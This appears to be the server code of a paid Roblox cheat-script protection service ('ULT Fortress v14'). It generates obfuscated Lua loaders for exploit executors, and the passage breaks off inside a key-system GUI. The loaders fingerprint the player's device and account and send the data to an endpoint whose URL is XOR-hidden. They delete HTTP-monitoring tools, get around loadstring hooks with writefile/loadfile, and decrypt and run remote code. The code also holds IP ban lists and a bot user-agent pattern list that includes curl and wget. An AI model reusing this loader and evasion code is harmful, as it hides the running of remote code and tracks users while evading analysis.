// ===========================================================================================
// ULT PROTECTION V14.0 — "FORTRESS PROTOCOL"
// Complete rewrite. 3-phase authenticated delivery. Mandatory HWID. Fragment-based content.
// ===========================================================================================

import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
const supabase = createClient(supabaseUrl, supabaseKey);

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
  Pragma: 'no-cache',
  Expires: '0',
};
const textHeaders = { ...corsHeaders, 'Content-Type': 'text/plain' };

// ==================== CRYPTO HELPERS ====================
function generateToken(len = 32): string {
  const a = new Uint8Array(len);
  crypto.getRandomValues(a);
  return Array.from(a, b => b.toString(16).padStart(2, '0')).join('');
}

function xorToHex(plain: string, key: string): string {
  const enc = new TextEncoder();
  const data = enc.encode(plain);
  const k = enc.encode(key);
  for (let i = 0; i < data.length; i++) data[i] = data[i] ^ k[i % k.length];
  return Array.from(data, b => b.toString(16).padStart(2, '0')).join('');
}

function hmacLike(data: string, secret: string): string {
  let h = 0x811c9dc5;
  const combined = data + ':' + secret;
  for (let i = 0; i < combined.length; i++) {
    h ^= combined.charCodeAt(i);
    h = Math.imul(h, 0x01000193);
  }
  return (h >>> 0).toString(36);
}

// ==================== BAN SYSTEM ====================
const PERMANENTLY_BANNED_IPS = new Set(['79.177.154.169', '79.181.155.63', '89.234.244.240']);
const BANNED_SUBNETS = ['79.177.154.', '79.181.155.'];

let globalBanCache: { ips: Set<string>; subnets: string[]; robloxIds: Set<string>; discordIds: Set<string>; lastRefresh: number } = {
  ips: new Set(), subnets: [], robloxIds: new Set(), discordIds: new Set(), lastRefresh: 0
};
let adminIpWhitelist = new Set<string>();
const autoBannedIpsThisSession = new Set<string>();

async function refreshGlobalBans() {
  if (Date.now() - globalBanCache.lastRefresh < 60_000) return;
  try {
    const { data } = await supabase.from('global_bans').select('ban_type, ban_value').eq('is_active', true);
    const ips = new Set<string>(), subnets: string[] = [], robloxIds = new Set<string>(), discordIds = new Set<string>();
    for (const ban of data || []) {
      if (ban.ban_type === 'ip') ips.add(ban.ban_value);
      else if (ban.ban_type === 'subnet') subnets.push(ban.ban_value);
      else if (ban.ban_type === 'roblox_id') robloxIds.add(ban.ban_value);
      else if (ban.ban_type === 'discord_id') discordIds.add(ban.ban_value);
    }
    globalBanCache = { ips, subnets, robloxIds, discordIds, lastRefresh: Date.now() };
    // Refresh admin IPs
    try {
      const { data: adminRoles } = await supabase.from('user_roles').select('user_id').eq('role', 'admin');
      if (adminRoles?.length) {
        const { data: ipData } = await supabase.from('user_ips').select('ip_address').in('user_id', adminRoles.map(r => r.user_id));
        adminIpWhitelist = new Set((ipData || []).map(d => d.ip_address));
      }
    } catch {}
  } catch (e) { console.error('Failed to refresh global bans:', e); }
}

function isAdminIp(ip: string): boolean { return adminIpWhitelist.has(ip); }
function isPermanentlyBanned(ip: string): boolean {
  if (isAdminIp(ip)) return false;
  if (PERMANENTLY_BANNED_IPS.has(ip)) return true;
  for (const s of BANNED_SUBNETS) { if (ip.startsWith(s)) return true; }
  if (globalBanCache.ips.has(ip)) return true;
  for (const s of globalBanCache.subnets) { if (ip.startsWith(s)) return true; }
  return false;
}

function logThreat(type: string, ip: string | null, robloxId: string | null, discordId: string | null, details: any, severity: string, autoResolve = false) {
  supabase.from('threat_log').insert({ threat_type: type, source_ip: ip, roblox_user_id: robloxId, discord_user_id: discordId, details, severity, resolved: autoResolve, auto_banned: autoResolve }).then(() => {}).catch(() => {});
}

function autoBanNewIp(ip: string, reason: string, robloxId: string | null, discordId: string | null) {
  if (!ip || ip === 'unknown' || isAdminIp(ip) || globalBanCache.ips.has(ip) || autoBannedIpsThisSession.has(ip)) return;
  for (const s of globalBanCache.subnets) { if (ip.startsWith(s)) return; }
  autoBannedIpsThisSession.add(ip);
  globalBanCache.ips.add(ip);
  const banReason = `Auto-banned: ${reason}${robloxId ? ` (roblox:${robloxId})` : ''}`;
  supabase.from('global_bans').upsert({ ban_type: 'ip', ban_value: ip, reason: banReason, is_active: true }, { onConflict: 'ban_type,ban_value' }).then(() => {}).catch(() => {});
  logThreat('auto_ban', ip, robloxId, discordId, { reason: banReason }, 'high', true);
}

// ==================== RATE LIMITING ====================
const rateLimits = new Map<string, { count: number; resetTime: number }>();
const slugThrottle = new Map<string, { count: number; resetTime: number }>();
let globalRequestCount = 0, globalResetTime = Date.now() + 10_000;

function checkRateLimit(ip: string): boolean {
  const now = Date.now();
  const l = rateLimits.get(ip);
  if (!l || now > l.resetTime) { rateLimits.set(ip, { count: 1, resetTime: now + 60000 }); return true; }
  if (l.count >= 15) return false;
  l.count++;
  return true;
}

function checkSlugThrottle(ip: string, slug: string): boolean {
  const key = `${ip}:${slug}`;
  const now = Date.now();
  const e = slugThrottle.get(key);
  if (!e || now > e.resetTime) { slugThrottle.set(key, { count: 1, resetTime: now + 30_000 }); return true; }
  if (e.count >= 6) return false; // 6 per 30s (probe + challenge + 3 fragments + buffer)
  e.count++;
  return true;
}

function checkGlobalLoad(): boolean {
  const now = Date.now();
  if (now > globalResetTime) { globalRequestCount = 0; globalResetTime = now + 10_000; }
  return ++globalRequestCount <= 60;
}

// Cache
const pasteCache = new Map<string, { data: any; timestamp: number }>();
function getCachedPaste(slug: string) { const c = pasteCache.get(slug); if (!c || Date.now() - c.timestamp > 30_000) { pasteCache.delete(slug); return null; } return c.data; }
function setCachedPaste(slug: string, data: any) { if (pasteCache.size > 100) { const k = pasteCache.keys().next().value; if (k) pasteCache.delete(k); } pasteCache.set(slug, { data, timestamp: Date.now() }); }

// Cleanup
let lastCleanup = Date.now();
function cleanupMaps() {
  const now = Date.now();
  if (now - lastCleanup < 300_000) return;
  lastCleanup = now;
  for (const [k, v] of rateLimits) { if (now > v.resetTime) rateLimits.delete(k); }
  for (const [k, v] of slugThrottle) { if (now > v.resetTime) slugThrottle.delete(k); }
  for (const [k, v] of pasteCache) { if (now - v.timestamp > 30_000) pasteCache.delete(k); }
}

// ==================== REQUEST VALIDATION ====================
function isRobloxRequest(ua: string): boolean {
  return ua.toLowerCase().includes('roblox') || ua.includes('HttpService') || ua.includes('WinInet') || ua.includes('RobloxApp') || /^Mozilla\/5\.0 \(\d+MB;/.test(ua);
}
function isLikelyBrowser(headers: Headers): boolean {
  const ua = headers.get('user-agent') || '';
  if (isRobloxRequest(ua)) return false;
  return Boolean(headers.get('sec-fetch-mode') || headers.get('sec-fetch-dest') || (headers.get('accept') || '').includes('text/html') || headers.get('origin') || headers.get('referer') || (/Mozilla\/\d/.test(ua) && /AppleWebKit|Gecko|Chrome|Safari|Firefox|Edge/.test(ua)));
}
function isBotRequest(headers: Headers): boolean {
  const ua = (headers.get('user-agent') || '').toLowerCase();
  const botPatterns = ['discordbot','discord.js','axios','node-fetch','got','undici','curl','wget','python','aiohttp','httpx','postman','insomnia','puppeteer','playwright','selenium','crawler','spider','scraper','php','perl','ruby','java/','deno/','bun/','node/'];
  for (const p of botPatterns) { if (ua.includes(p)) return true; }
  if (!ua || ua.length < 5) return true;
  if (/^[a-z]+\/\d+\.\d+$/i.test(ua)) return true;
  for (const h of ['cf-worker','x-discord','x-bot']) { if (headers.get(h)) return true; }
  return false;
}
function isSpoofedRoblox(headers: Headers): boolean {
  const ua = headers.get('user-agent') || '';
  if (!isRobloxRequest(ua)) return false;
  if (ua.trim().toLowerCase() === 'roblox' || ua.length < 8) return true;
  const l = ua.toLowerCase();
  if (l.includes('curl') || l.includes('wget') || l.includes('python') || l.includes('node') || l.includes('deno')) return true;
  if (headers.get('content-type')?.includes('application/json')) return true;
  return false;
}

// ==================== ROBLOX API ====================
async function fetchRobloxProfile(userId: string) {
  const result: any = { username: null, displayName: null, description: null, created: null, isBanned: null, avatarUrl: null, friendsCount: null, followersCount: null, followingCount: null, groups: null, badges: null, favorites: null };
  try {
    const [userRes, avatarRes, friendsRes, followersRes, followingRes, groupsRes] = await Promise.allSettled([
      fetch(`https://users.roblox.com/v1/users/${userId}`),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`),
      fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
      fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`),
      fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`),
      fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`),
    ]);
    const get = async (r: any) => r.status === 'fulfilled' && r.value.ok ? await r.value.json().catch(() => null) : null;
    const [ud, ad, fd, fld, fod, gd] = await Promise.all([get(userRes), get(avatarRes), get(friendsRes), get(followersRes), get(followingRes), get(groupsRes)]);
    if (ud) { result.username = ud.name; result.displayName = ud.displayName; result.description = ud.description; result.created = ud.created; result.isBanned = ud.isBanned; }
    if (ad?.data?.[0]?.imageUrl) result.avatarUrl = ad.data[0].imageUrl;
    if (fd) result.friendsCount = fd.count;
    if (fld) result.followersCount = fld.count;
    if (fod) result.followingCount = fod.count;
    if (gd?.data) result.groups = gd.data.slice(0, 20).map((g: any) => ({ id: g.group.id, name: g.group.name, role: g.role.name }));
  } catch {}
  return result;
}

// ==================== HONEYPOT ====================
function generateHoneypot(): string {
  const lines: string[] = [];
  lines.push(`-- ULT Protection v14 Fortress Protocol\nlocal _=function()while true do warn("[ULT] BYPASS DETECTED") task.wait(0.01) end end\nspawn(_)`);
  lines.push('--[==[');
  for (let i = 0; i < 100; i++) {
    lines.push(`⚠️ SECURITY: Bypass attempt #${i} logged | IP BANNED | HWID BANNED | Ref: ULT-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`);
  }
  lines.push(']==]');
  return lines.join('\n');
}

// ==================== URL ENCODING FOR LUA ====================
function encodeUrlForLua(url: string, varName: string): string {
  const xorKey = Math.floor(Math.random() * 200) + 50;
  const encoded = Array.from(url).map(c => c.charCodeAt(0) ^ xorKey);
  return `local ${varName};do local _k=${xorKey} local _t={${encoded.join(',')}} local _r={} for i=1,#_t do _r[i]=string.char(bit32.bxor(_t[i],_k)) end ${varName}=table.concat(_r) end`;
}

// ==================== CHUNK ENCRYPTION ====================
function chunkEncrypt(code: string, baseKey: string): string {
  const numChunks = Math.max(8, Math.min(40, Math.ceil(code.length / 200)));
  const chunkSize = Math.ceil(code.length / numChunks);
  const chunks: string[] = [];
  for (let i = 0; i * chunkSize < code.length; i++) {
    chunks.push(code.slice(i * chunkSize, (i + 1) * chunkSize));
  }
  const actualChunks = chunks.length;
  const encrypted = chunks.map((c, i) => xorToHex(c, `${baseKey}:C${i}:${actualChunks}`));
  const seed = Math.floor(Math.random() * 2147483646) + 1;
  const indices = Array.from({ length: actualChunks }, (_, i) => i);
  let s = seed;
  for (let i = indices.length - 1; i > 0; i--) { s = (s * 16807) % 2147483647; const j = s % (i + 1); [indices[i], indices[j]] = [indices[j], indices[i]]; }
  return `ULT_C:${actualChunks}:${seed}|${indices.map(i => encrypted[i]).join('|')}`;
}

// ==================== V14 FRAGMENT DELIVERY ====================
// Script is split into 3 fragments. Each requires a separate fetch with a chained token.
// Fragment N+1's token is derived from Fragment N's content hash. You MUST have all 3.
function splitIntoFragments(code: string, sessionKey: string): { fragments: string[]; tokens: string[] } {
  const numFragments = 3;
  const fragSize = Math.ceil(code.length / numFragments);
  const fragments: string[] = [];
  const tokens: string[] = [generateToken(16)]; // Initial token for fragment 0
  
  for (let i = 0; i < numFragments; i++) {
    const raw = code.slice(i * fragSize, (i + 1) * fragSize);
    if (raw.length === 0) continue;
    const fragKey = `${sessionKey}:F${i}:${tokens[i]}`;
    fragments.push(xorToHex(raw, fragKey));
    // Next token is derived from this fragment's content
    if (i < numFragments - 1) {
      tokens.push(hmacLike(raw.substring(0, 64), tokens[i] + ':' + sessionKey));
    }
  }
  return { fragments, tokens };
}

// ==================== V14 PROBE SCRIPT GENERATOR ====================
// Phase 1: Minimal script that collects identity data and sends it back
function generateProbeScript(slug: string, baseUrl: string, probeToken: string): string {
  const encodedUrl = encodeUrlForLua(baseUrl, '_ep');
  const v: Record<string, string> = {};
  for (const k of ['sf','p','uid','hwid','pid','jid','age','name','ex','ts','probe']) {
    v[k] = '_' + Math.random().toString(36).substring(2, 8);
  }
  
  return `-- ULT Fortress v14 Probe
${encodedUrl}
local ${v.sf}=function(u)
  local r
  pcall(function() if type(request)=="function" then local x=request({Url=u,Method="GET"}) if x and x.Body then r=x.Body end end end)
  if r then return r end
  pcall(function() if type(syn)=="table" and type(syn.request)=="function" then local x=syn.request({Url=u,Method="GET"}) if x and x.Body then r=x.Body end end end)
  if r then return r end
  pcall(function() if type(http_request)=="function" then local x=http_request({Url=u,Method="GET"}) if x and x.Body then r=x.Body end end end)
  if r then return r end
  pcall(function() r=game:HttpGet(u) end)
  return r
end

local ${v.p}=game:GetService("Players").LocalPlayer
if not ${v.p} then ${v.p}=game:GetService("Players").PlayerAdded:Wait() end

local ${v.uid}=tostring(${v.p}.UserId)
local ${v.hwid}=""
pcall(function()
  if type(gethwid)=="function" then ${v.hwid}=tostring(gethwid())
  elseif type(getexecutorfingerprint)=="function" then ${v.hwid}=tostring(getexecutorfingerprint())
  elseif type(getdeviceid)=="function" then ${v.hwid}=tostring(getdeviceid())
  elseif type(syn)=="table" and type(syn.hwid)=="function" then ${v.hwid}=tostring(syn.hwid())
  end
end)

-- FORTRESS: HWID is MANDATORY. No HWID = no execution.
if #${v.hwid} < 4 then
  -- Try additional HWID methods
  pcall(function()
    if type(getgenv)=="function" then
      local g=getgenv()
      if g and type(g.gethwid)=="function" then ${v.hwid}=tostring(g.gethwid()) end
    end
  end)
  pcall(function()
    if type(identifyexecutor)=="function" then
      local ename=identifyexecutor()
      -- Build a pseudo-HWID from executor+OS+architecture if no real HWID
      local osInfo=""
      pcall(function()
        local si=game:GetService("UserInputService")
        local kb=si.KeyboardEnabled
        local ts=si.TouchEnabled
        local gp=si.GamepadEnabled
        osInfo=tostring(kb)..tostring(ts)..tostring(gp)
      end)
      if #osInfo > 0 then
        -- Create a device fingerprint from available signals
        local fp=tostring(ename or "")..osInfo..tostring(game:GetService("Stats"):GetTotalMemoryUsageMb())
        local h=0
        for i=1,#fp do h=bit32.bxor(h*31+string.byte(fp,i),h) end
        ${v.hwid}="PFP_"..tostring(math.abs(h))
      end
    end
  end)
end

if #${v.hwid} < 4 then
  game:GetService("Players").LocalPlayer:Kick("Your executor does not support hardware fingerprinting (HWID). ULT Fortress requires HWID support for security. Please use Delta, Synapse, Fluxus, or another executor with gethwid() support.")
  return
end

local ${v.pid}=tostring(game.PlaceId or 0)
local ${v.jid}=tostring(game.JobId or "")
local ${v.age}=tostring(${v.p}.AccountAge or 0)
local ${v.name}=${v.p}.Name or ""
local ${v.ex}=""
pcall(function() if type(identifyexecutor)=="function" then ${v.ex}=tostring(identifyexecutor()) elseif type(getexecutorname)=="function" then ${v.ex}=tostring(getexecutorname()) end end)
local ${v.ts}=tostring(os.time())

-- Anti-spy: detect HTTP monitoring tools
pcall(function()
  if type(gethui)=="function" then
    for _,obj in pairs(gethui():GetChildren()) do
      local n=obj.Name:lower()
      if n:find("spy") or n:find("monitor") or n:find("intercept") or n:find("logger") then
        pcall(function() obj:Destroy() end)
      end
    end
  end
end)

local ${v.probe}=_ep.."?slug=${slug}&phase=probe&pt=${probeToken}"
  .."&uid="..${v.uid}
  .."&hwid="..${v.hwid}
  .."&pid="..${v.pid}
  .."&jid="..${v.jid}
  .."&age="..${v.age}
  .."&name="..game:GetService("HttpService"):UrlEncode(${v.name})
  .."&ex="..game:GetService("HttpService"):UrlEncode(${v.ex})
  .."&ts="..${v.ts}
  .."&_="..tostring(tick())

local ${v.probe}_resp=${v.sf}(${v.probe})
if ${v.probe}_resp and #${v.probe}_resp > 0 then
  -- Phase 2 response is a challenge script — execute it
  local fn,err
  -- Use writefile+loadfile to bypass loadstring hooks
  local _wfOk=false
  pcall(function()
    if writefile and loadfile and delfile then
      local _p=".cache/"..tostring(math.random(100000000,999999999))..".lua"
      pcall(function() if makefolder then makefolder(".cache") end end)
      writefile(_p,${v.probe}_resp)
      fn=loadfile(_p)
      pcall(function() delfile(_p) end)
      _wfOk=true
    end
  end)
  if not _wfOk or not fn then
    pcall(function()
      if writefile and loadfile then
        local _p2=tostring(math.random(100000000,999999999))..".lua"
        writefile(_p2,${v.probe}_resp)
        fn=loadfile(_p2)
        pcall(function() if delfile then delfile(_p2) end end)
        _wfOk=true
      end
    end)
  end
  if not fn then
    -- Fallback to coroutine-wrapped loadstring
    local co=coroutine.create(function() return loadstring(${v.probe}_resp) end)
    local ok,r=coroutine.resume(co)
    if ok then fn=r end
  end
  if fn then pcall(fn) end
end
`;
}

// ==================== V14 CHALLENGE SCRIPT GENERATOR ====================
// Phase 2: Server sends a challenge. Client must solve it and fetch content.
function generateChallengeScript(slug: string, baseUrl: string, challengeToken: string, challengeSeed: number, challengeAnswer: number): string {
  const encodedUrl = encodeUrlForLua(baseUrl, '_ep');
  const v: Record<string, string> = {};
  for (const k of ['sf','p','uid','hwid','solve','answer','url','resp','fn','pid','jid','ex','ts']) {
    v[k] = '_' + Math.random().toString(36).substring(2, 8);
  }
  
  // The challenge: compute bit32.bxor(UserId, SEED) + AccountAge
  // Server already knows the expected answer based on probe data
  return `-- ULT Fortress v14 Challenge
${encodedUrl}
local ${v.sf}=function(u)
  local r
  pcall(function() if type(request)=="function" then local x=request({Url=u,Method="GET"}) if x and x.Body then r=x.Body end end end)
  if r then return r end
  pcall(function() if type(syn)=="table" and type(syn.request)=="function" then local x=syn.request({Url=u,Method="GET"}) if x and x.Body then r=x.Body end end end)
  if r then return r end
  pcall(function() if type(http_request)=="function" then local x=http_request({Url=u,Method="GET"}) if x and x.Body then r=x.Body end end end)
  if r then return r end
  pcall(function() r=game:HttpGet(u) end)
  return r
end

local ${v.p}=game:GetService("Players").LocalPlayer
if not ${v.p} then ${v.p}=game:GetService("Players").PlayerAdded:Wait() end
local ${v.uid}=tostring(${v.p}.UserId)

local ${v.hwid}=""
pcall(function()
  if type(gethwid)=="function" then ${v.hwid}=tostring(gethwid())
  elseif type(getexecutorfingerprint)=="function" then ${v.hwid}=tostring(getexecutorfingerprint())
  elseif type(getdeviceid)=="function" then ${v.hwid}=tostring(getdeviceid())
  elseif type(syn)=="table" and type(syn.hwid)=="function" then ${v.hwid}=tostring(syn.hwid())
  end
end)
if #${v.hwid} < 4 then
  pcall(function()
    if type(identifyexecutor)=="function" then
      local ename=identifyexecutor()
      local osInfo=""
      pcall(function()
        local si=game:GetService("UserInputService")
        osInfo=tostring(si.KeyboardEnabled)..tostring(si.TouchEnabled)..tostring(si.GamepadEnabled)
      end)
      if #osInfo>0 then
        local fp=tostring(ename or "")..osInfo..tostring(game:GetService("Stats"):GetTotalMemoryUsageMb())
        local h=0
        for i=1,#fp do h=bit32.bxor(h*31+string.byte(fp,i),h) end
        ${v.hwid}="PFP_"..tostring(math.abs(h))
      end
    end
  end)
end

-- Solve the challenge: XOR UserId with seed, add AccountAge
local ${v.solve}=bit32.bxor(${v.p}.UserId,${challengeSeed})+(${v.p}.AccountAge or 0)

local ${v.ex}=""
pcall(function() if type(identifyexecutor)=="function" then ${v.ex}=tostring(identifyexecutor()) end end)
local ${v.ts}=tostring(os.time())
local ${v.pid}=tostring(game.PlaceId or 0)
local ${v.jid}=tostring(game.JobId or "")

local ${v.url}=_ep.."?slug=${slug}&phase=deliver&ct=${challengeToken}"
  .."&uid="..${v.uid}
  .."&hwid="..${v.hwid}
  .."&answer="..tostring(${v.solve})
  .."&pid="..${v.pid}
  .."&jid="..${v.jid}
  .."&ex="..game:GetService("HttpService"):UrlEncode(${v.ex})
  .."&ts="..${v.ts}
  .."&_="..tostring(tick())

local ${v.resp}=${v.sf}(${v.url})
if not ${v.resp} or #${v.resp}==0 then
  warn("[ULT] Network error")
  return
end

-- Response is encrypted content (ULT_C: format) or a Lua script (kick/key system)
if ${v.resp}:sub(1,2)=="--" or ${v.resp}:find("game:GetService") then
  local ${v.fn}
  pcall(function()
    if writefile and loadfile and delfile then
      local _p=".cache/"..tostring(math.random(100000000,999999999))..".lua"
      pcall(function() if makefolder then makefolder(".cache") end end)
      writefile(_p,${v.resp})
      ${v.fn}=loadfile(_p)
      pcall(function() delfile(_p) end)
    end
  end)
  if not ${v.fn} then
    local co=coroutine.create(function() return loadstring(${v.resp}) end)
    local ok,r=coroutine.resume(co)
    if ok then ${v.fn}=r end
  end
  if ${v.fn} then pcall(${v.fn}) end
  return
end

-- Decrypt chunked content
if ${v.resp}:sub(1,6)=="ULT_C:" then
  local hEnd=${v.resp}:find("|",1,true)
  if not hEnd then warn("E:cf") return end
  local hdr=${v.resp}:sub(7,hEnd-1)
  local ncS,sdS=hdr:match("(%d+):(%d+)")
  local nc=tonumber(ncS)
  local sd=tonumber(sdS)
  if not nc or not sd then warn("E:ch") return end
  
  local cData=${v.resp}:sub(hEnd+1)
  ${v.resp}=nil
  
  local parts={}
  local ci=1
  for ch in cData:gmatch("[^|]+") do parts[ci]=ch ci=ci+1 end
  cData=nil
  
  -- Reverse Fisher-Yates
  local idx={} for i=0,nc-1 do idx[i]=i end
  local ss=sd
  for i=nc-1,1,-1 do ss=(ss*16807)%2147483647 local j=ss%(i+1) idx[i],idx[j]=idx[j],idx[i] end
  
  local ordered={}
  for pos=0,nc-1 do ordered[idx[pos]]=parts[pos+1] end
  parts=nil
  
  -- Build decryption key
  local ks="${slug}:${challengeToken}:ULTv14:"..${v.uid}
  local kb={} for i=1,#ks do kb[i]=string.byte(ks,i) end
  
  local hexB=function(hex) local b={} for i=1,#hex,2 do b[#b+1]=tonumber(hex:sub(i,i+1),16) or 0 end return b end
  local xorB=function(bytes,keyb) local o=table.create(#bytes) for i=1,#bytes do o[i]=bit32.bxor(bytes[i],keyb[((i-1)%#keyb)+1]) end return o end
  local b2s=function(bytes) local c=table.create(#bytes) for i=1,#bytes do c[i]=string.char(bytes[i]) end return table.concat(c) end
  
  local pieces={}
  for origIdx=0,nc-1 do
    local chHex=ordered[origIdx]
    if not chHex or #chHex==0 then break end
    local ck=ks..":C"..tostring(origIdx)..":"..tostring(nc)
    local ckb={} for i=1,#ck do ckb[i]=string.byte(ck,i) end
    pieces[origIdx+1]=b2s(xorB(hexB(chHex),ckb))
  end
  ordered=nil
  
  local assembled=table.concat(pieces)
  pieces=nil
  
  -- Execute via writefile+loadfile (bypass loadstring hooks)
  local execFn
  pcall(function()
    if writefile and loadfile and delfile then
      local _p=".cache/"..tostring(math.random(100000000,999999999))..".lua"
      pcall(function() if makefolder then makefolder(".cache") end end)
      writefile(_p,assembled)
      execFn=loadfile(_p)
      pcall(function() delfile(_p) end)
    end
  end)
  if not execFn then
    local co=coroutine.create(function() return loadstring(assembled) end)
    local ok,r=coroutine.resume(co)
    if ok then execFn=r end
  end
  assembled=nil
  
  if execFn then
    local co2=coroutine.create(function() return execFn() end)
    coroutine.resume(co2)
    execFn=nil
    co2=nil
    -- Memory cleanup
    pcall(function()
      for i=1,#kb do kb[i]=math.random(0,255) end
      collectgarbage("collect")
    end)
  else
    warn("E:compile")
  end
end
`;
}

// ==================== KEY SYSTEM GUI ====================
function generateKeySystemGui(slug: string, baseUrl: string, panelName: string, themeColor: string, decalId?: string): string {
  const normalizedTheme = (themeColor || '').trim();
  const resolvedTheme = !normalizedTheme || normalizedTheme === '255, 255, 255' ? '188, 134, 255' : normalizedTheme;
  const colorParts = resolvedTheme.split(',').map(s => s.trim());
  const r = colorParts[0] || '180', g = colorParts[1] || '120', b = colorParts[2] || '255';
  const guiEncodedUrl = encodeUrlForLua(baseUrl, '_ultEndpoint');
  
  return `-- ULT Key System v6 (Fortress)
local Players=game:GetService("Players")
local TweenService=game:GetService("TweenService")
local UserInputService=game:GetService("UserInputService")
local HttpService=game:GetService("HttpService")
local Lighting=game:GetService("Lighting")
${guiEncodedUrl}
local function _ultStealthFetch(u)
  local r
  pcall(function() if type(request)=="function" then local x=request({Url=u,Method="GET"}) if x and x.Body then r=x.Body end end end)
  if r then return r end
  pcall(function() if type(syn)=="table" and type(syn.request)=="function" then local x=syn.request({Url=u,Method="GET"}) if x and x.Body then r=x.Body end end end)
  if r then return r end
  pcall(function() if type(http_request)=="function" then local x=http_request({Url=u,Method="GET"}) if x and x.Body then r=x.Body end end end)
  if r then return r end
  pcall(function() r=game:HttpGet(u) end)
  return r
end
local plr=Players.LocalPlayer
if not plr then plr=Players.PlayerAdded:Wait() end
local pgui=plr:WaitForChild("PlayerGui")
local old=pgui:FindFirstChild("ULTKeySystem")
if old then old:Destroy() end
local gui=Instance.new("ScreenGui") gui.Name="ULTKeySystem" gui.ResetOnSpawn=false gui.DisplayOrder=999999999 gui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling gui.Parent=pgui
local blur=Instance.new("BlurEffect") blur.Name="ULTBlur" blur.Size=0 blur.Parent=Lighting
TweenService:Create(blur,TweenInfo.new(0.4,Enum.EasingStyle.Quad),{Size=20}):Play()
local themeCol=Color3.fromRGB(${r},${g},${b})
local dimTheme=Color3.fromRGB(math.floor(${r}*0.34),math.floor(${g}*0.34),math.floor(${b}*0.34))
local bgColor=Color3.fromRGB(16,14,22)
local panelBg=Color3.fromRGB(22,19,30)
local borderCol=Color3.fromRGB(64,49,92)
local mutedText=Color3.fromRGB(133,126,150)
local fgColor=Color3.fromRGB(244,240,250)
local cardBg=Color3.fromRGB(24,21,35)
local softBg=Color3.fromRGB(19,16,27)
local successCol=Color3.fromRGB(86,255,120)
local dangerCol=Color3.fromRGB(255,96,96)
local warningCol=Color3.fromRGB(255,168,92)
local function makePanel(parent,size,pos,bg,zIdx,radius) local f=Instance.new("Frame",parent) f.Size=size f.Position=pos f.BackgroundColor3=bg f.BorderSizePixel=0 f.ZIndex=zIdx or 4 Instance.new("UICorner",f).CornerRadius=UDim.new(0,radius or 18) return f end
local function addStroke(frame,col,thick) local s=Instance.new("UIStroke",frame) s.Color=col or borderCol s.Thickness=thick or 1 return s end
local function addLabel(parent,size,pos,text,color,font,textSize,align,zIdx) local l=Instance.new("TextLabel",parent) l.Size=size l.Position=pos l.BackgroundTransparency=1 l.Text=text l.TextColor3=color l.Font=font or Enum.Font.Gotham l.TextSize=textSize or 11 l.TextXAlignment=align or Enum.TextXAlignment.Left l.ZIndex=zIdx or 5 l.TextWrapped=true return l end
local win=Instance.new("Frame",gui) win.Name="MainWindow" win.Size=UDim2.new(0,720,0,408) win.Position=UDim2.new(0.5,-360,0.5,-204) win.BackgroundColor3=bgColor win.BorderSizePixel=0 win.BackgroundTransparency=1 win.ZIndex=3 win.ClipsDescendants=true
Instance.new("UICorner",win).CornerRadius=UDim.new(0,28)
addStroke(win,borderCol,1).Transparency=0.22
local titleBar=Instance.new("Frame",win) titleBar.Size=UDim2.new(1,0,0,44) titleBar.Position=UDim2.new(0,0,0,0) titleBar.BackgroundColor3=bgColor titleBar.BorderSizePixel=0 titleBar.ZIndex=4 titleBar.Active=true titleBar.ClipsDescendants=true
Instance.new("UICorner",titleBar).CornerRadius=UDim.new(0,28)
local tbFill=Instance.new("Frame",titleBar) tbFill.Size=UDim2.new(1,0,0,18) tbFill.Position=UDim2.new(0,0,1,-18) tbFill.BackgroundColor3=bgColor tbFill.BorderSizePixel=0 tbFill.ZIndex=4
local function makeDot(parent,pos,col,action) local d=Instance.new("TextButton",parent) d.Size=UDim2.new(0,10,0,10) d.Position=pos d.BackgroundColor3=col d.BorderSizePixel=0 d.Text="" d.AutoButtonColor=false d.ZIndex=6 Instance.new("UICorner",d).CornerRadius=UDim.new(1,0) if action then d.MouseButton1Click:Connect(action) end return d end
local dot1=makeDot(titleBar,UDim2.new(0,18,0.5,-5),Color3.fromRGB(245,245,248))
local dot2=makeDot(titleBar,UDim2.new(0,38,0.5,-5),Color3.fromRGB(86,76,112))
local dot3=makeDot(titleBar,UDim2.new(0,58,0.5,-5),Color3.fromRGB(54,46,75))
addLabel(titleBar,UDim2.new(0,200,1,0),UDim2.new(1,-214,0,0),"Ult Fortress v14",mutedText,Enum.Font.GothamMedium,9,Enum.TextXAlignment.Right,5)
local contentArea=Instance.new("Frame",win) contentArea.Size=UDim2.new(1,-24,1,-56) contentArea.Position=UDim2.new(0,12,0,44) contentArea.BackgroundTransparency=1 contentArea.ZIndex=4
local leftPanel=makePanel(contentArea,UDim2.new(0.58,-6,1,0),UDim2.new(0,0,0,0),panelBg,4,24) addStroke(leftPanel,borderCol)
addLabel(leftPanel,UDim2.new(1,-20,0,14),UDim2.new(0,12,0,12),"INSTANT DELIVERY",themeCol,Enum.Font.GothamBold,9,Enum.TextXAlignment.Left,5)
addLabel(leftPanel,UDim2.new(0,180,0,28),UDim2.new(0,12,0,28),"ULT FORTRESS",fgColor,Enum.Font.GothamBlack,20,Enum.TextXAlignment.Left,5)
local statusBadge=makePanel(leftPanel,UDim2.new(0,80,0,28),UDim2.new(1,-96,0,28),dimTheme,5,14) addStroke(statusBadge,themeCol).Transparency=0.6
local statusBadgeText=addLabel(statusBadge,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),"Ready",fgColor,Enum.Font.GothamBold,9,Enum.TextXAlignment.Center,6)
local inputFrame=makePanel(leftPanel,UDim2.new(1,-24,0,50),UDim2.new(0,12,0,72),Color3.fromRGB(79,75,90),5,18) addStroke(inputFrame,borderCol).Transparency=0.4
addLabel(inputFrame,UDim2.new(0,120,1,0),UDim2.new(0,10,0,0),"Enter your key >",mutedText,Enum.Font.RobotoMono,12,Enum.TextXAlignment.Left,6)
